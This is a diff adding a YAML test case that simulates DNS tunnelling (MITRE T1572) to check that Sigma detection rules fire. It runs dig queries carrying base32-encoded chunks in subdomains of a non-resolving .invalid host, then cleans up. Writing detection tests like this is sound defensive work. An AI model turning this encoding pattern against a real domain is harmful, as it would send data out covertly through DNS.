@@ -1,0 +1,46 @@
+id: eye-605-encoded-dns-tunnel
+name: Base32-padded subdomain DNS query (tunnel marker)
+description: |
+  Mimics T1572 (Protocol Tunneling) — a DNS query with a subdomain that
+  carries base32-encoded data, identifiable by the trailing '====' padding.
+  Three queries to a .invalid domain so the resolution fails cleanly.
+  Real domains never contain '====' — near-zero-FP marker.
+
+attack:
+  technique: T1572
+  tactic: TA0011
+
+destructiveness: low
+platforms: [linux]
+
+execute:
+  - shell: bash
+    command: |
+      mkdir -p /tmp/eyeexam-605
+      if ! command -v dig >/dev/null 2>&1; then
+        echo "dig not installed; skipping" > /tmp/eyeexam-605/out
+        exit 0
+      fi
+      for chunk in MFRGGZDFMZTWQ2LK5UXG6JBA MZQXEZJONRSWCZBANNXXEZJN ORSXG5DBOJSWILBANV2XGZJN; do
+        dig +short +tries=1 +time=1 TXT "${chunk}====.eye605.invalid" \
+          >> /tmp/eyeexam-605/dig.out 2>&1 || true
+      done
+      echo "eye-605 dns tunnel complete"
+
+cleanup:
+  - shell: bash
+    command: |
+      rm -rf /tmp/eyeexam-605
+
+verify_cleanup:
+  - shell: bash
+    command: |
+      test ! -e /tmp/eyeexam-605
+
+expected_detections:
+  - sigma_id: 8b7c4d00-0001-4000-8000-000000000022
+    backend: slither
+    description: proc-dns-tunnel-marker — fires on dig with '====' in argv
+  - sigma_id: 8b7c4d00-0001-4000-8000-000000000021
+    backend: slither
+    description: proc-dns-suspicious-query — also fires (TXT query to .invalid)
